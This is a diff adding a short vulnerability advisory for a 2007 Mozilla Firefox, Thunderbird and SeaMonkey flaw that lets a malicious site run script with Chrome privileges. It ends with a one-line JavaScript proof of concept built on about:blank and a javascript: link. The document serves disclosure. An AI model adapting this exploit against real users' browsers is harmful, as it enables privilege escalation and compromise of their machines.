@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/25142/info
+
+Mozilla Firefox, Thunderbird, and SeaMonkey are prone to a vulnerability that allows JavaScript to execute with unintended privileges.
+
+A malicious site may be able to cause the execution of a script with Chrome privileges. Attackers could exploit this issue to execute hostile script code with privileges that exceed those that were intended. Certain Firefox extensions may not intend 'about:blank' to execute script code with Chrome privileges.
+
+NOTE: This issue was introduced by the fix for MFSA 2007-20. 
+
+The following proof of concept is available:
+
+w=open("about:blank");alert(1);u="javascript:alert(Components.stack);";w.document.body.innerHTML=u.link(u);w.focus();1 or top.opener.content.location="about:blank";alert(1);u="javascript:alert(Components.stack);";(w=top.opener.content).document.body.innerHTML=u.link(u);w.focus();1
+
